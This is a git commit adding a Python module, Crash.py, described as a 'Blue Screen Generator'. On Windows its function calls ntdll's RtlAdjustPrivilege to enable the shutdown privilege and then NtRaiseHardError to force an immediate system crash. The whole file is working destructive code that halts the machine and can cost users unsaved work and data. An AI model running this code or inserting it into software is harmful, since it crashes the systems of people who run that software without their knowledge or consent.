e4c66dba5fafb2c05efbc61e3974736add8af01e
shift.0x7d8 <zixuan.zhao@ms.zzny.fun>
2024-06-05 17:30:20 -0400

    Add Blue Screen Generator

---
+++ module/Crash.py
@@ -0,0 +1,31 @@
+import sys
+
+def triggerBlueScreen():
+    if sys.platform.startswith("win32"):
+        print("Creating a Blue Screen. ")
+        from ctypes import windll
+        from ctypes import c_int
+        from ctypes import c_uint
+        from ctypes import c_ulong
+        from ctypes import POINTER
+        from ctypes import byref
+
+        nullptr = POINTER(c_int)()
+
+        windll.ntdll.RtlAdjustPrivilege(
+            c_uint(19), 
+            c_uint(1), 
+            c_uint(0), 
+            byref(c_int())
+        )
+
+        windll.ntdll.NtRaiseHardError(
+            c_ulong(0xC000007B), 
+            c_ulong(0), 
+            nullptr, 
+            nullptr, 
+            c_uint(6), 
+            byref(c_uint())
+        )
+    else:
+        print("Not Using Window, Unable to Create Blue Screen. ")
